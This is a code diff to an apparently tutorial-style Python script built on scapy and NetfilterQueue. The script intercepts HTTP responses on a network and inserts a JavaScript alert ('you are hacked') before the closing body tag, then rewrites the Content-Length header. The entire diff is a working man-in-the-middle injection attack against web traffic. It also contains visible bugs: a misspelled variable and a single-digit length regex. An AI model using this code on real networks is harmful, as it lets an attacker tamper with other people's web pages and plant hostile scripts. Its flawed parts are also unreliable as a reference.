@@ -36,7 +36,16 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
             print(scapy_paclet.show())
-            load = load.replace("</<body>", "<script> console.log('you are hacked !!!!!!!!!!'); </script>")
+
+            injection_code =" <script> alert('you are hacked !!!!!!!!!!'); </script> "
+            load = load.replace("</body>", f"{injection_code} </body>")
+
+            content_length_search = re.search('(?:Content-Length:\s)(\d)', load)
+            if content_length_search and 'text/html' in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str (new_content_length))
+
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
@@ -48,3 +57,4 @@ def process_packet(packet):
 queue = NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+ 
